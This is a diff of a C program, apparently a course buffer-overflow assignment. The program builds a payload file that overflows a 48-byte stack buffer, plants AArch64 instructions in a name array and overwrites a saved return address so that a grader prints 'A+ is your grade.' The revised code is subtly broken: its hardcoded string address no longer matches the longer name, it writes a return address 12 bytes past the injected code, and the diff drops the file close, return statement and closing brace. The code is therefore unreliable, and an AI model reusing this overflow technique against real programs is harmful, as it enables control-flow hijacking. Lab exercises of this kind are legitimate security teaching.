@@ -25,172 +25,113 @@
 #include "miniassembler.h"
 
 /*--------------------------------------------------------------------*/
-/* Interactive behavior of main:
-   - The main function does not accept any command-line arguments.
-   - It does not read from stdin.
-   - It writes binary data to a file named "dataAplus".
-   - It does not write anything to stdout or stderr.
-   - It returns 0 upon successful completion.                         */
+/* Interactive behavior of the main function:                         */
+/* - The main function does not accept command-line arguments.         */
+/* - It does not read from stdin.                                      */
+/* - It writes binary data to a file named "dataAplus".                */
+/* - It does not write to stdout or stderr.                            */
+/* - It returns 0 upon successful completion.                          */
 /*--------------------------------------------------------------------*/
 
 int main(void) {
-    /*----------------------------------------------------------------*/
-    /* Local Variables and Addresses:                                 */
-    /* We know from analysis:                                         */
-    /* grade char address:            0x420044                        */
-    /* name array starts at:         0x420058                        */
-    /* We have a buffer of size 48 (buf) on the stack in readString,   */
-    /* and we will overflow it to overwrite getName's X30 return       */
-    /* address. By placing instructions in 'name', we can cause a jump.*/
-    /* The main code calls mprotect(...) so that name array is         */
-    /* executable.                                                    */
-    /*                                                                */
-    /* We'll store:                                                   */
-    /* "AnishKKat\0A+ is your grade.%c\0" in the name area first.      */
-    /* After that string, we align to a 4-byte boundary, then insert   */
-    /* our instructions:                                              */
-    /*   adr x0, (address of "A+ is your grade.%c\0")                 */
-    /*   mov w1, '\n'                                                 */
-    /*   b PRINTF_CALL_SITE                                            */
-    /*                                                                */
-    /* Then we fill the remainder of the 48 bytes if needed with nulls */
-    /* and finally overwrite the stored X30 of getName to point to our */
-    /* injected instructions.                                         */
-    /*----------------------------------------------------------------*/
-
-    FILE *fp = fopen("dataAplus", "w");
-    if (fp == NULL) exit(1);
-
-    /* Constants derived from memory map:
-       PRINT_CALL_SITE is where we jump to call printf with our args.
-       From analysis, we can call the printf that prints "%c is your grade.\n"
-       at address 0x400874 (as seen in the provided example code snippet).
-       We'll use the same addresses from example for consistency. */
-
+    /* Constants and addresses based on analysis */
     enum {
-        MAX_BUF = 48,
-        GRADE_ADDR = 0x420044,
-        PRINT_CALL = 0x400874,   /* Address in main that calls printf("%c is your grade.\n", grade) */
-        NAME_START = 0x420058    /* start of the name array */
+        MAX_BUFFER_SIZE = 48,                  /* Size of the buffer in readString */
+        GRADE_ADDRESS = 0x420044,              /* Address where 'grade' is stored */
+        PRINT_GRADE_INSTR_ADDR = 0x400874,     /* Address that calls "printf(%c is your grade...)" */
+        NAME_START_ADDRESS = 0x420058          /* Start address of the name array in bss */
     };
 
-    /* We'll place our instructions starting right after our strings.
-       We'll need to keep track of the current offset. */
-    int bytesWritten = 0;
-    unsigned long currentAddr = NAME_START;
+    /* Variables for tracking how many bytes we have written and current addresses */
+    int iBytesWritten = 0;
+    unsigned long ulStringAddress = NAME_START_ADDRESS;
+    unsigned long ulCurrentAddress = NAME_START_ADDRESS;
 
-    /* Write the attacker's name (can truncate if needed). */
-    const char *attackerName = "AnishKKat";
-    fputs(attackerName, fp);
-    bytesWritten += (int)strlen(attackerName);
+    /* Open the output file */
+    FILE *fp = fopen("dataAplus", "w");
+    if (fp == NULL) return 1;
 
-    /* Null-terminate the name */
+    /*----------------------------------------------------------------*/
+    /* Local comments describing written bytes:                       */
+    /* We first write the attacker's name: "AnishKKata"               */
+    /* Then a null terminator.                                        */
+    /* Then the payload string: "A+ is your grade.%c" plus a null.     */
+    /* After writing these strings, we align to a 4-byte boundary.     */
+    /* Next, we insert instructions (adr, mov, b) to prepare x0, w1,   */
+    /* and branch to the printf call site.                             */
+    /* Finally, we pad until we reach 48 bytes, and then overwrite     */
+    /* the return address with the start address of our instructions.  */
+    /*----------------------------------------------------------------*/
+
+    /* Write the student's name */
+    fputs("AnishKKata", fp); 
+    iBytesWritten += (int)strlen("AnishKKata");
+
+    /* Write a null terminator after the name */
     fputc('\0', fp);
-    bytesWritten++;
+    iBytesWritten++;
 
-    /* Write the message that we want to print via printf later:
-       "A+ is your grade.%c"
-       We add a '%c' so that the code at PRINT_CALL prints something nicely.
-       Then null-terminate it. */
+    /* Update string address after writing the name and null */
+    ulStringAddress += iBytesWritten;
+
+    /* Write the "A+ is your grade.%c" message followed by null */
     fputs("A+ is your grade.%c", fp);
-    bytesWritten += 20; /* length of the string "A+ is your grade.%c" is 20 chars */
     fputc('\0', fp);
-    bytesWritten++;
+    iBytesWritten += 20 + 1; /* 20 chars + 1 null = 21 bytes */
+    ulCurrentAddress += iBytesWritten;
 
-    /* Update currentAddr after writing these chars. */
-    currentAddr += bytesWritten;
-
-    /* Align currentAddr to a 4-byte boundary for instructions. */
-    while ((currentAddr % 4) != 0) {
+    /* Align the current address to a multiple of 4 for instructions */
+    while (ulCurrentAddress % 4 != 0) {
         fputc(0, fp);
-        bytesWritten++;
-        currentAddr++;
+        iBytesWritten++;
+        ulCurrentAddress++;
     }
 
-    /* Now we insert instructions using MiniAssembler:
-       1) adr x0, address_of("A+ is your grade.%c")
-          This loads the string address into x0 for printf.
-       2) mov w1, '\n'
-          Move newline char into w1 as argument.
-       3) b PRINT_CALL
-          Branch to the instruction that calls printf with (x0, w1).
+    /* Now insert instructions:
+       We need to compute their addresses carefully.
+       After writing "AnishKKata\0" (10 bytes) and "A+ is your grade.%c\0" (21 bytes),
+       total is 31 bytes written before alignment padding.
 
-       Note: The string starts at NAME_START + strlen("AnishKKat") + 1 = NAME_START + 10,
-       plus the 20 chars of message + 1 null = 31 more bytes, total 41 bytes. So the
-       string "A+ is your grade.%c" starts at NAME_START+11 actually (after name+\0).
-       Let's be precise:
+       NAME_START_ADDRESS=0x420058
+       After 31 bytes: 0x420058 + 31 = 0x420058 + 0x1F = 0x420077
+       We wrote one null byte to align, bringing us to 0x420078 as start of instructions.
 
-       NAME_START=0x420058
-       We wrote: "AnishKKat" (9 chars) + '\0'(1 char) = 10 bytes total
-       So at NAME_START + 10 = 0x420058+10 = 0x420062 starts "A+ is your grade.%c"
-       That string is 20 chars + '\0' = 21 bytes.
-       The string start: 0x420062
-       We'll load this address into x0.
+       The "A+ is your grade.%c" string starts at NAME_START_ADDRESS + 10 = 0x420058 + 10 = 0x420062.
+       We'll load that address into x0.
 
-       Instructions placed at currentAddr (NAME_START+31=0x420058+31=0x420077?), 
-       but we must re-check after final count:
-
-       Actually bytes after name:
-         name: 9 chars  + '\0' =10 bytes
-         message: "A+ is your grade.%c"=20 chars + '\0'=21 bytes
-         Total so far: 10 + 21 = 31 bytes
-       currentAddr=NAME_START+31=0x420058+31=0x420058+0x1F=0x420077
-       Aligning currentAddr to 4 bytes: 0x420077 %4=3 remainder, write one null:
-       After writing one null: currentAddr=0x420078
-       Perfectly divisible by 4 now.
-
-       So instructions start at 0x420078.
-
-       String start address: 0x420062 for "A+ is your grade.%c"
-
-       We'll do:
-       adr x0,0x420062 at instrAddr=0x420078
-       mov w1,'\n'
-       b PRINT_CALL at instrAddr=0x420080 (just next instructions)
+       Instructions start at 0x420078.
     */
+    unsigned long ulInstructionsStart = 0x420078;
+    unsigned long ulMessageStart = 0x420062;
+    unsigned int uiInstruction;
 
-    unsigned long instrAddr = currentAddr;  /* where instructions start */
-    unsigned long strAddr = 0x420062;       /* address of the string */
+    /* adr x0, ulMessageStart */
+    uiInstruction = MiniAssembler_adr(0, ulMessageStart, ulInstructionsStart);
+    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
+    iBytesWritten += 4;
+    ulInstructionsStart += 4;
 
-    /* adr x0, strAddr */
-    unsigned int uiInst = MiniAssembler_adr(0, strAddr, instrAddr);
-    fwrite(&uiInst, sizeof(uiInst), 1, fp);
-    bytesWritten += 4;
-    instrAddr += 4;
+    /* mov w1, '\n' */
+    uiInstruction = MiniAssembler_mov(1, '\n');
+    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
+    iBytesWritten += 4;
+    ulInstructionsStart += 4;
 
-    /* mov w1,'\n' */
-    uiInst = MiniAssembler_mov(1, '\n');
-    fwrite(&uiInst, sizeof(uiInst), 1, fp);
-    bytesWritten += 4;
-    instrAddr += 4;
+    /* b PRINT_GRADE_INSTR_ADDR */
+    uiInstruction = MiniAssembler_b(PRINT_GRADE_INSTR_ADDR, ulInstructionsStart);
+    fwrite(&uiInstruction, sizeof(unsigned int), 1, fp);
+    iBytesWritten += 4;
+    ulInstructionsStart += 4;
 
-    /* b PRINT_CALL */
-    uiInst = MiniAssembler_b(PRINT_CALL, instrAddr);
-    fwrite(&uiInst, sizeof(uiInst), 1, fp);
-    bytesWritten += 4;
-    instrAddr += 4;
-
-    /* Fill up to the 48-byte limit of the stack buf if needed. 
-       Our instructions and strings must fit in 48 bytes read into buf 
-       (actually the input can be longer since no newline is allowed before).
-       The grader copies from buf to name array. But we must ensure the return 
-       address is overwritten correctly. We'll just pad zeros until we reach 48 bytes.
-    */
-    while (bytesWritten < MAX_BUF) {
+    /* Pad the rest of the buffer up to 48 bytes */
+    while (iBytesWritten < MAX_BUFFER_SIZE) {
         fputc(0, fp);
-        bytesWritten++;
+        iBytesWritten++;
     }
 
-    /* Overwrite getName's X30 with the address of our injected instructions (instrAddr start).
-       Our instructions start at 0x420078.
-       We placed adr at 0x420078, so let's set the return address to 0x420078. */
-    unsigned long jumpAddr = 0x420078;
-    fwrite(&jumpAddr, sizeof(jumpAddr), 1, fp);
+    /* Overwrite the stored return address (getName's X30) with our instruction start */
+    fwrite(&ulInstructionsStart, sizeof(unsigned long), 1, fp);
 
-    /* Write EOF */
-    /* Not strictly necessary, but just to end the file cleanly. */
+    /* Write EOF to finalize */
     fputc(EOF, fp);
-
-    fclose(fp);
-    return 0;
-}
+   
